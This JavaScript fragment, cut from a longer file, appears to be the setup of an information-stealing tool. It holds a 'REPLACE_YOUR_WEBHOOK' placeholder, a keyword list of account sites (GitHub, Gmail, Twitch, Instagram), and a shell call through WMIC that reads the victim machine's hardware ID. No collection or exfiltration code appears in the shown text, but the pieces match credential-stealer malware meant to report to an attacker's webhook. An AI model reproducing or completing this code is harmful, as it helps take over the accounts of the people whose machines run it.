...
var webhookstring = "REPLACE_YOUR_WEBHOOK";
var keywordstring = ['github.com','gmail.com','twitch.tv','instagram.com'];


var hwid = execSync('WMIC csproduct get UUID').toString().trim().split('\n')[1];
